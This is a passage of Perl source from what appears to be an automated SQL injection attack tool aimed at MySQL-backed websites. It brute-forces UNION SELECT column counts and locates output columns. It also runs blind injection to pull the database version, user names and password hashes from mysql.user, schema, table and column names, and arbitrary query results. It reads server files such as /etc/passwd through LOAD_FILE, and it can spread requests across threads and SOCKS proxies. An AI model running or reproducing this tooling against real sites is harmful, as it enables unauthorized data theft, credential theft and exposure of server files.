$aa = gets5000();
$data1 = "";
$data1 = $aa->{$_},for sort {$a <=> $b} keys %$aa;
($good_url,$c_number) = split(/\|\|/,$data1);
if ($good_url) {
print "---------------------------\n";
print "Column number = " . $c_number . "\n";
print "URL - " . $good_url . "\n";
print FILE1 "------------------\n";
print FILE1 "Number of columns:" . $c_number . "\n";
print FILE1 "------------------\n";
print FILE1 $good_url . "\n";
goto PRINTABLE_COLUMN;
}
################################################## ###########
sub gets5000 {
$ii = 0;
$i = $current_column_start;
$union = "";
$size = 0;
while($i <= $current_column_number) {
if ($current_column_start < 21) {
if($i == 1) {
$union=$i;
} else {
$union = $union . "," . $i;
}
} else {
if($current_column_start == 21) {
$union = $union . "1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 ,21";
$current_column_start = 0;
} else {
$union = $union . "," . $i;
}
}
if ($current_column_limit) {
$current11 = $source_sql_c . $plus_c . "union" . $plus_c . "select" . $plus_c . $union . $plus_c . "limit" . $plus_c . $current_column_limit . $filtr_c;
} else {
$current11 = $source_sql_c . $plus_c . "union" . $plus_c . "select" . $plus_c . $union . $filtr_c;
}
push(@columns_brute, $current11);
push(@columns_brute_n, $i);
$i++;
}
$size = @columns_brute;
%res = ();
$thr502 = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr502) {
$thr502[$_] = threads->create(\&gets502);
}
for(0..$thr502) {
%res = (%res, %{$thr502[$_]->join});
}
sub gets502 {
$| = 1;
%hash = ();
while ($num < $size) {
{ lock($num);
$num++; }
$ii = $num;
if ($ii < $size) {
$current10 = $columns_brute[$num];
$nom = $columns_brute_n[$num];
$column_brute_flag = column_check();
if ($column_brute_flag == 1) {
$hash{$ii} = $current10 . "||" . $nom;
$ii = $size;
break;
return \%hash;
}
}
print $num . "\r";
sleep $pause;
}
}
return \%res;
}
print "----------\n";
print "Can't find column number...\n";
close(FILE1);
goto START;
################################################## ###############
PRINTABLE_COLUMN:
print "--------------------------------------\n";
print "Searching printable column - no limit\n";
print "--------------------------------------\n";
if (!$current_column_limit) {
$current_column_limit= "";
} else {
if ($current_column_limit == "0,1") {goto LIMIT0;}
if ($current_column_limit == "1,1") {goto LIMIT1;}
}
%aa = ();
$print_col = 0;
$good_url = "";
$aa = gets6000();
$data1 = "";
$data1 = $aa->{$_},for sort {$a <=> $b} keys %$aa;
($print_col,$good_url) = split(/\|\|/,$data1);
if ($print_col) {
print "---------------------------\n";
print "Printable column = " . $print_col . "\n";
print "Right url - " . $good_url . "\n";
print FILE1 "------------------\n";
print FILE1 "Printable column:" . $print_col . "\n";
print FILE1 "------------------\n";
print FILE1 $good_url . "\n";
print "----------\n";
print "Saved in " . "z_" . $host5. ".txt\n";
close(FILE1);
goto START;
}
################################################## ###########
LIMIT0:
print "--------------------------------------\n";
print "Searching printable column - limit" . $plus_c . "0,1\n";
print "--------------------------------------\n";
$current_column_limit = "0,1";
%aa = ();
$print_col = 0;
$good_url = "";
$aa = gets6000();
$data1 = "";
$data1 = $aa->{$_},for sort {$a <=> $b} keys %$aa;
($print_col,$good_url) = split(/\|\|/,$data1);
if ($print_col) {
print "---------------------------\n";
print "Printable column = " . $print_col . "\n";
print "Right url - " . $good_url . "\n";
print FILE1 "------------------\n";
print FILE1 "Printable column:" . $print_col . "\n";
print FILE1 "------------------\n";
print FILE1 $good_url . "\n";
print "----------\n";
print "Saved in " . "z_" . $host5. ".txt\n";
close(FILE1);
goto START;
}
################################################## ###########
LIMIT1:
print "--------------------------------------\n";
print "Searching printable column - limit" . $plus_c . "1,1\n";
print "--------------------------------------\n";
$current_column_limit = "1,1";
%aa = ();
$print_col = 0;
$good_url = "";
$aa = gets6000();
$data1 = "";
$data1 = $aa->{$_},for sort {$a <=> $b} keys %$aa;
($print_col,$good_url) = split(/\|\|/,$data1);
if ($print_col) {
print "---------------------------\n";
print "Printable column = " . $print_col . "\n";
print "Right url - " . $good_url . "\n";
print FILE1 "------------------\n";
print FILE1 "Printable column:" . $print_col . "\n";
print FILE1 "------------------\n";
print FILE1 $good_url . "\n";
print "----------\n";
print "Saved in " . "z_" . $host5. ".txt\n";
close(FILE1);
goto START;
}
################################################## ###########
sub gets6000 {
$union = "";
$current = "";
$host = $host5;
for($i=1; $i <= $c_number; $i++) {
for($j=1; $j <= $c_number; $j++) {
$temp = $sql_pref1 . $i . $sql_pref2;
if($j==1){if($j==$i){$union=$temp}else{$union=$j}}
elsif($j==$i){$union=$union.",".$temp}
else{$union=$union.",".$j;}
}
if ($current_column_limit) {
$current11 = $source_sql_c . $plus_c . "union" . $plus_c . "select" . $plus_c . $union . $plus_c . "limit" . $plus_c . $current_column_limit . $filtr_c;
} else {
$current11 = $source_sql_c . $plus_c . "union" . $plus_c . "select" . $plus_c . $union . $filtr_c;
}
push(@columns_print, $current11);
push(@columns_print_n, $i);
}
$size = @columns_print;
%res = ();
$thr509 = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
$ii = 0;
for(0..$thr509) {
$thr509[$_] = threads->create(\&gets509);
}
for(0..$thr509) {
%res = (%res, %{$thr509[$_]->join});
}
sub gets509 {
$| = 1;
%hash = ();
while ($num < $size) {
{ lock($num);
$num++; }
$ii = $num;
$current = $columns_print[$num];
$nom = $columns_print_n[$num];
if ($ii < $size) {
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
$hash{$ii} = $nom . "||" . $current;
$ii = $size;
break;
return \%hash;
}
}
print $num . "\r";
sleep $pause;
}
}
return \%res;
}
print "----------\n";
print "Can't find printable column...\n";
close(FILE1);
goto START;
}
## Mysql blind ##
if ($choice == 10) {
if ($bl_url =~ m/^https:\/\/?([^\/]+)/i) {
$host3 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
$host = $host3;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;
print " DONE\n";
print "-----------------------------------------\n";
}
print $host . "\n";
if ($use_socks == 1 && $socks_check == 0) {
$check_url = $host;
our $query = "GET / HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: http://" . $check_url . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Ubuntu/9.04 (jaunty) Shiretoko/3.5.1\r\n"
. "Connection: close\r\n\r\n";
print "----------------------------------------\n";
print "You choose mode with SOCKS, try to find good in $socks_file ...\n";
print "Timeout = 5 sec:\n";
print "----------------------------------------\n";
$socks_check = 0;
$check_socks = socks_check();
($current_proxy_host,$current_proxy_port,$socks_ty pe) = split(/:/,$check_socks);
$proxy_message = "$current_proxy_host:$current_proxy_port, SOCKS" . $socks_type;
if ($current_proxy_host) {
$socks_check = 1;
print "Will use --> $proxy_message\n";
} else {
$socks_check = 0;
$proxy_message = "No";
print "No good SOCKS in " . $socks_file . ", change mode. Exit...\n";
}
}
START10:
$schema_flag = 0;
print "-----------------------------------------\n";
print "Choose mode:\n";
print "----------\n";
print " [1] Blind System information\n";
print " [2] Blind inj get DB-names from information_schema.schemata\n";
print " [3] Blind inj get tables from DB-name\n";
print " [4] <<< Blind ANY QUERY >>>\n";
print " [5] Blind inj get column_name from tables from DB-name\n";
print " [6] Blind inj get LOAD_FILE (file_priv = Y)\n";
print " [7] Blind BRUTE LOAD_FILE log/conf files (file_priv = Y)\n";
print " [8] Blind Get tables from information_schema (current DB)\n";
print " [9] Blind Get column_name from table (current DB)\n";
print " [10] Blind Get data from columns\n";
print " [11] Blind Brute MySql4 for tables & columns\n";
print " [12] Main menu\n";
print "----------\n";
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
if ($choice==1) {
open( FILE1, ">>" . "z_" .$host3 . ".txt" ); # ???? ??? ?????? ???????????
print FILE1 "----------------------------------\n";
print FILE1 "Blind MYsql system information:\n";
print FILE1 "----------------------------------\n";
# ?????? ?????? #
$url1 = "version()";
# ?????? ??? ???? #
$url2 = "database()";
# ?????? ????? #
$url3 = "user()";
# ?????? @@basedir #
$url4 = "@@" . "basedir";
# ?????? @@datadir #
$url5 = "@@" . "datadir";
# ?????? @@tmpdir #
$url6 = "@@" . "tmpdir";
# ?????? @@version_compile_os #
$url7 = "@@" . "version_compile_os";
# ?????? mysql.user #
$url8 = "user" . $bl_plus . "from" . $bl_plus . "mysql.user";
# ?????? mysql.password #
$url9 = "password" . $bl_plus . "from" . $bl_plus . "mysql.user";
# ?????? file_priv #
$url10 = "file_priv" . $bl_plus ."from" . $bl_plus . "mysql.user" . $bl_plus . "where" . $bl_plus . "user=user";
####################
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
$bl_lenght = "";
$ii = 0;
$mflag = 0;
print "-----------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
@array = ($url1,$url2,$url3,$url4,$url5,$url6,$url7,$url8,$ url9,$url0);
$size = @array; #???????? ?????? ???????
for(0..$thr) {
$trl[$_] = threads->create(\&gets101);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets101 {
$| = 1;
while ($num < $size) {
{ lock($num);
$num++; }
$bl_current = $array[$num];
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print $bl_current . " [length]:" . $bl_lenght . "\n";
if ($mflag == 1) {
################################################## ##########
%aa = ();
$aa = gets1000();
$data1 = "";
$data1 .= $aa->{$_},for sort {$a <=> $b} keys %$aa;
################################################## ###########
} else {
$data1 = "";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$data1 .= chr(get_res_normal());
} else {
$data1 .= chr(get_res_normal1());
} 
print $data1 . "\r";
}
}
print "\n------------------------------------------------------\n";
print "---> " . $bl_current . ": " . $data1 . "\n";
print "------------------------------------------------------\n";
print FILE1 $bl_current . ": " . $data1 . "\n";
}
$oo++;
sleep $pause;
}
}
$time = localtime;
print "\n" . $time . "\n";
print "----------\n";
print "Saved in " . "z_" . $host3 . ".txt\n";
close(FILE1);
goto START10;
}
# Blind db names
if ($choice==2) {
open( FILE1, ">>" . "z_" .$host3 . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------\n";
## ???????? ##
$bl_lenght = "";
$ii = 0;
$bl_current = "(select" . $bl_plus . "count(schema_name)" . $bl_plus . "from" . $bl_plus . "information_schema.schemata)";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "Count DB in information_schema.schemata [length]:" . $bl_lenght . "\n";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$bl_table_number_NIS .= get_res_count();
} else {
$bl_table_number_NIS .= get_res_count1();
} 
print $bl_table_number_NIS . "\r";
sleep $pause;
}
print "\n------------------------------------------------------\n";
print "Count DB in information_schema.schemata [value]:" . $bl_table_number_NIS . "\n";
print "--------------------------------------------------------\n";
} else {
print "\n------------------------------------------------------\n";
print "Cant't get data...\n";
print "------------------------------------------------------\n";
}
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
## start from2 ##
print FILE1 "-----------------------------------------\n";
print FILE1 "DB in information_schema.schemata - $bl_table_number_NIS\n";
print FILE1 "-----------------------------------------\n";
print "Normal MODE - records > 10\n";
print "Fast MODE - records <= 10\n";
print "-----------------------------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
## end from2
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
TABLES:
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
# ?????? DB #
$bl_lenght = "";
$ii = 0;
$s = 0;
$mflag = 0;
print "-----------------------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets102111);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets102111 {
$| = 1;
while ($num < $bl_table_number_NIS) {
{ lock($num);
$num++; }
$sss = $num;
$bl_current = "(select" . $bl_plus . "schema_name" . $bl_plus . "from" . $bl_plus . "information_schema.schemata" . $bl_plus . "limit" . $bl_plus . $num . ",1)";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "\nDB limit $sss,1 [length]:" . $bl_lenght . "\n";
if ($mflag == 1) {
################################################## ##########
%aa = ();
$aa = gets1000();
$data1 = "";
$data1 .= $aa->{$_},for sort {$a <=> $b} keys %$aa;
################################################## ###########
} else {
$data1 = "";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$data1 .= chr(get_res_normal());
} else {
$data1 .= chr(get_res_normal1());
} 
print $data1 . "\r";
}
}
print "\n-----------------------------------\n";
print " ---> DB limit $sss,1: " . $data1 . "\n";
print "-----------------------------------\n";
print FILE1 " ---> DB limit $sss,1: " . $data1 . "\n";
$data = "";
}
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host3 . ".txt\n";
close(FILE1);
goto START10;
} # end DB names
# Blind tables from DB names
if ($choice==3) {
open( FILE1, ">>" . "z_" .$host3 . ".txt" ); # ???? ??? ?????? ???????????
$bl_table_number_NIS = "";
print "-----------------------------------------\n";
print "Enter the DB-name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
print "DB-name: $choice\n";
print "----------\n";
$choice1 = ascii_to_hex $choice;
## ???????? ##
$bl_lenght = "";
$ii = 0;
$bl_current = "(select" . $bl_plus . "count(table_name)" . $bl_plus . "from" . $bl_plus . "information_schema.tables" . $bl_plus . "where" . $bl_plus . "table_schema=" . $plus . $choice1 . ")";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "Tables in DB [$choice]: $tab_num1 [length]:" . $bl_lenght . "\n";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$bl_table_number_NIS .= get_res_count();
} else {
$bl_table_number_NIS .= get_res_count1();
} 
print $bl_table_number_NIS . "\r";
sleep $pause;
}
print "\n------------------------------------------------------\n";
print "Tables in DB [$choice]: $tab_num1 [value]:" . $bl_table_number_NIS . "\n";
print "--------------------------------------------------------\n";
} else {
print "\n------------------------------------------------------\n";
print "Cant't get data...\n";
print "------------------------------------------------------\n";
}
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
## start from2 ##
print FILE1 "-----------------------------------------\n";
print FILE1 "Tables in DB [$choice]:- $bl_table_number_NIS\n";
print FILE1 "-----------------------------------------\n";
print "Normal MODE - records > 10\n";
print "Fast MODE - records <= 10\n";
print "-----------------------------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
## end from2
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
TABLES:
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
# ?????? DB #
$bl_lenght = "";
$ii = 0;
$s = 0;
$mflag = 0;
print "-----------------------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets109999);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets109999 {
$| = 1;
while ($num < $bl_table_number_NIS) {
{ lock($num);
$num++; }
$sss = $num;
$bl_current = "(select" . $bl_plus . "table_name" . $bl_plus . "from" . $bl_plus . "information_schema.tables" . $bl_plus . "where" . $bl_plus . "table_schema=" . $bl_plus . $choice1 . $bl_plus . "limit" . $bl_plus . $num . ",1)";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "\nTable limit $sss,1 [length]:" . $bl_lenght . "\n";
if ($mflag == 1) {
################################################## ##########
%aa = ();
$aa = gets1000();
$data1 = "";
$data1 .= $aa->{$_},for sort {$a <=> $b} keys %$aa;
################################################## ###########
} else {
$data1 = "";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$data1 .= chr(get_res_normal());
} else {
$data1 .= chr(get_res_normal1());
} 
print $data1 . "\r";
}
}
print "\n-----------------------------------\n";
print " ---> Table limit $sss,1: " . $data1 . "\n";
print "-----------------------------------\n";
print FILE1 " ---> Table limit $sss,1: " . $data1 . "\n";
$data = "";
}
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host3 . ".txt\n";
close(FILE1);
goto START10;
} # end tables from DB names
################################################## ################################################## ################################################## #################################
# Blind some query
if ($choice==4) {
open( FILE1, ">>" . "z_" .$host3 . ".txt" ); # ???? ??? ?????? ???????????
$bl_table_number_NIS = "";
$choice100 = "";
$choice200 = "";
$choice300 = "";
if(!$bl_your_query) {
print "\$bl_your_query is empty in code\n";
print "Enter your query, example - concat_ws(0x3a,table_schema,table_name)\n\n";
$choice100 = <STDIN>;
chomp $choice100;
print "\n\nEnter condition, without LIMIT [auto count]!!! Example: +from+information_schema.tables+where+table_name+l ike+0x7573657273 (if NOT- press ENTER):\n\n";
$choice200 = <STDIN>;
chomp $choice200;
} else {
$choice100 = $bl_your_query;
$choice200 = $bl_from;
}
$choice300 = $choice100 . $choice200;
print "---------------------------------------------------------------------------------------------------------------------------------------\n";
print "your query: (select(". $choice100 . ")" . $choice200 . ")\n";
print "---------------------------------------------------------------------------------------------------------------------------------------\n";
$bl_lenght = "";
$ii = 0;
$bl_current = "(select(count(" . $choice100 . "))" . $choice200 . ")";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "Count records for your answer[length]:" . $bl_lenght . "\n";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$bl_table_number_NIS .= get_res_count();
} else {
$bl_table_number_NIS .= get_res_count1();
} 
print $bl_table_number_NIS . "\r";
sleep $pause;
}
print "\n------------------------------------------------------\n";
print "Count records for your answer[value]:" . $bl_table_number_NIS . "\n";
print "--------------------------------------------------------\n";
} else {
print "\n------------------------------------------------------\n";
print "Cant't get data...\n";
print "------------------------------------------------------\n";
}
## ???????? ##
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
$thr = $kol_threads; # ???-?? ???????
if($bl_table_number_NIS == 1) {
$num = 0; # ?? ????????
} else {$num = -1}
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$bl_lenght = "";
$ii = 0;
$s = 0;
$mflag = 0;
print "-----------------------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets102222);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets102222 {
$| = 1;
while ($num < $bl_table_number_NIS) {
{ lock($num);
$num++; }
$sss = $num;
if ($bl_table_number_NIS>1){
$bl_current = "(select(" . $choice100 . ")" . $choice200 . $bl_plus . "limit" . $bl_plus . $num . ",1)";
} else {
$bl_current = "(select(" . $choice100 . ")" . $choice200 . ")";
} 
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "\nAnswer[length]:" . $bl_lenght . "\n";
if ($mflag == 1) {
################################################## ##########
%aa = ();
$aa = gets1000();
$data1 = "";
$data1 .= $aa->{$_},for sort {$a <=> $b} keys %$aa;
################################################## ###########
} else {
$data1 = "";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$data1 .= chr(get_res_normal());
} else {
$data1 .= chr(get_res_normal1());
} 
print $data1 . "\r";
}
}
print "\n-----------------------------------\n";
print " Answer limit $sss,1 ---> " . $data1 . "\n";
print "-----------------------------------\n";
print FILE1 " Answer limit $sss,1 ---> " . $data1 . "\n";
$data = "";
}
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host3 . ".txt\n";
close(FILE1);
goto START10;
} # end some query
################################################## ################################################## ################################################## ###
# Blind columns from tables from DB names
if ($choice==5) {
open( FILE1, ">>" . "z_" .$host3 . ".txt" ); # ???? ??? ?????? ???????????
$bl_table_number_NIS = "";
print "-----------------------------------------\n";
print "Enter the DB-name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
print "DB-name: $choice\n";
print "----------\n";
$choice1 = ascii_to_hex $choice;
print "-----------------------------------------\n";
print "Enter the TABLE-name: ";
$choice2 = <STDIN>;
chomp $choice2;
if ($choice2 =~ m/-/imgs) {$choice2 = "`" . $choice2 . "`"}
print "TABLE-name: $choice2\n";
print "----------\n";
$choice3 = ascii_to_hex $choice2;
## ???????? ##
$bl_lenght = "";
$ii = 0;
$bl_current = "(select" . $bl_plus . "count(column_name)" . $bl_plus . "from" . $bl_plus . "information_schema.columns" . $bl_plus . "where" . $bl_plus . "table_name=" . $choice3 . $bl_plus . "and" . $bl_plus . "table_schema=" . $plus . $choice1 . ")";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "Columns in [$choice.$choice2] [length]:" . $bl_lenght . "\n";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$bl_table_number_NIS .= get_res_count();
} else {
$bl_table_number_NIS .= get_res_count1();
} 
print $bl_table_number_NIS . "\r";
sleep $pause;
}
print "\n------------------------------------------------------\n";
print "Columns in [$choice.$choice2] [value]:" . $bl_table_number_NIS . "\n";
print "--------------------------------------------------------\n";
} else {
print "\n------------------------------------------------------\n";
print "Cant't get data...\n";
print "------------------------------------------------------\n";
}
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
## start from2 ##
print FILE1 "-----------------------------------------\n";
print FILE1 "Columns in [$choice.$choice2]: - $bl_table_number_NIS\n";
print FILE1 "-----------------------------------------\n";
print "Normal MODE - records > 10\n";
print "Fast MODE - records <= 10\n";
print "-----------------------------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
## end from2
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
TABLES:
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
# ?????? DB #
$bl_lenght = "";
$ii = 0;
$s = 0;
$mflag = 0;
print "-----------------------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets102333);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets102333 {
$| = 1;
while ($num < $bl_table_number_NIS) {
{ lock($num);
$num++; }
$sss = $num;
$bl_current = "(select" . $bl_plus . "column_name" . $bl_plus . "from" . $bl_plus . "information_schema.columns" . $bl_plus . "where" . $bl_plus . "table_name=" . $choice3 . $bl_plus . "and" . $bl_plus . "table_schema=" . $plus . $choice1 . $bl_plus . "limit" . $bl_plus . $num . ",1)";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "\nColumn limit $sss,1 [length]:" . $bl_lenght . "\n";
if ($mflag == 1) {
################################################## ##########
%aa = ();
$aa = gets1000();
$data1 = "";
$data1 .= $aa->{$_},for sort {$a <=> $b} keys %$aa;
################################################## ###########
} else {
$data1 = "";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$data1 .= chr(get_res_normal());
} else {
$data1 .= chr(get_res_normal1());
} 
print $data1 . "\r";
}
}
print "\n-----------------------------------\n";
print " ---> Column limit $sss,1: " . $data1 . "\n";
print "-----------------------------------\n";
print FILE1 " ---> Column limit $sss,1: " . $data1 . "\n";
$data = "";
}
sleep $pause;
}
}
print "----------\n";
print "Saved in " . "z_" . $host3 . ".txt\n";
close(FILE1);
goto START10;
} # end columns from tables from DB names
# blind LOAD_FILE log/conf BRUTE 
if ($choice==7) {
open( FILE1, ">>" . "z_" .$host3 . ".txt" ); # ???? ??? ?????? ???????????
$bl_lenght=0; 
print " Brute log/conf files\n";
print " -------------\n";
print FILE1 " Brute log/conf files\n";
print FILE1 " -------------\n";
open(FILE, "<", $lrl_list);
while(<FILE>) {
chomp;
push(@lrl_list, $_);
}
close(FILE);
$size = 0;
$size = @lrl_list;
print "File: $lrl_list\n";
print "Paths: $size\n";
print "-------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets996655);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets996655 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$choice1111 = '/'.$lrl_list[$num];
$choice2222 = ascii_to_hex $choice1111;
print $choice1111 . "\n";
$bl_lenght = "";
$bl_current = "length(load_file(" . $choice2222 . "))";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 2)) {
print " ---> " . $choice1111 . "\n";
print FILE1 " " . $choice1111 . "\n";
}
$bl_lenght=0;
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host3 . ".txt\n";
close(FILE1);
goto START10;
} # end blind LOAd_FILE BRUTE
# blind LOAd_FILE
if ($choice==6) {
open( FILE1, ">>" . "z_" .$host3 . ".txt" ); # ???? ??? ?????? ???????????
$bl_table_number_NIS = "";
print "-----------------------------------------\n";
print "Enter file name (example: /etc/passwd): ";
$choice = <STDIN>;
chomp $choice;
print "File name for read: $choice\n";
$choice1 = ascii_to_hex $choice;
## ???????? ##
$bl_lenght = "";
$ii = 0;
$bl_current = "length(load_file(" . $choice1 . "))";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 2)) {
print "File [$choice] size [length]:" . $bl_lenght . "\n";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$bl_table_number_NIS .= get_res_count();
} else {
$bl_table_number_NIS .= get_res_count1();
} 
print $bl_table_number_NIS . "\r";
sleep $pause;
}
print "\n------------------------------------------------------\n";
print "File [$choice] size: - $bl_table_number_NIS bytes\n";
print "--------------------------------------------------------\n";
} else {
print "\n------------------------------------------------------\n";
print "Cant't get data...\n";
print "------------------------------------------------------\n";
close(FILE1);
goto START10;
}
$time = localtime;
print $time . "\n";
## start from2 ##
print FILE1 "-----------------------------------------\n";
print FILE1 "File [$choice] size: - $bl_table_number_NIS bytes\n";
print FILE1 "-----------------------------------------\n";
# ?????? ???? #
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
## end from2
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
TABLES:
$time = localtime;
print $time . "\n";
print "-----------------------------------\n";
# ?????? DB #
$bl_lenght = "";
$ii = 0;
$s = 0;
$mflag = 0;
print "-----------------------------------\n";
$bl_current = "(load_file(" . $choice1 . "))";
%aa = ();
$aa = load_file();
$data1000 = "";
$data1000 .= $aa->{$_},for sort {$a <=> $b} keys %$aa;
print FILE1 $data1000;
sub load_file {
$thr = $kol_threads; # ???-?? ???????
print "Get ALL file ($bl_table_number_NIS) or PART of file ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START byte: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END byte: ";
$choice2 = <STDIN>;
chomp $choice2;
$bl_table_number_NIS = $choice2;
print "Dump bytes of file from [" . ($num+2) . "] to [" . ($bl_table_number_NIS) . "]\n";
}
print "-----------------------------------------\n";
## end from2
%res1 = ();
for(0..$thr) {
$trl[$_] = threads->create(\&gets102444);
}
for(0..$thr) {
%res1 = (%res1, %{$trl[$_]->join});
}
sub gets102444 {
$data2 = "";
$| = 1;
while ($num < $bl_table_number_NIS) {
{ lock($num);
$num++; }
$ii = $num;
if ($bl_mode==0){
$data2 = chr(get_res_normal());
} else {
$data2 = chr(get_res_normal1()); 
}
$hash1{$ii} = $data2;
print $data2;
}
return \%hash1
}
return \%res1;
}
print "----------\n";
print "Saved in " . "z_" . $host3 . ".txt\n";
close(FILE1);
goto START10;
} # end blind LOAd_FILE
if ($choice==8) {
open( FILE1, ">>" . "z_" .$host3 . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------\n";
## ???????? ##
$bl_lenght = "";
$ii = 0;
$bl_current = "(select" . $bl_plus . "count(table_name)" . $bl_plus . "from" . $bl_plus . "information_schema.tables" . $bl_plus . "where" . $bl_plus . "table_schema!=0x696e666f726d6174696f6e5f736368656d 61)";
if ($bl_mode==0) {
$bl_lenght = len_check();
} else {
$bl_lenght = len_check1(); 
} 
if (($bl_lenght >= 1) && ($bl_lenght < 1000)) {
print "Count tables NOT in information_schema [length]:" . $bl_lenght . "\n";
for ($ii = 1; $ii <= $bl_lenght; $ii++) {
if ($bl_mode==0) {
$bl_table_number_NIS .= get_res_count();
} else {
$bl_table_number_NIS .= get_res_count1();
} 
print $bl_table_number_NIS . "\r";
sleep $pause;
}
print "\n------------------------------------------------------\n";
print "Count tables NOT in information_schema [value]:" . $bl_table_number_NIS . "\n";
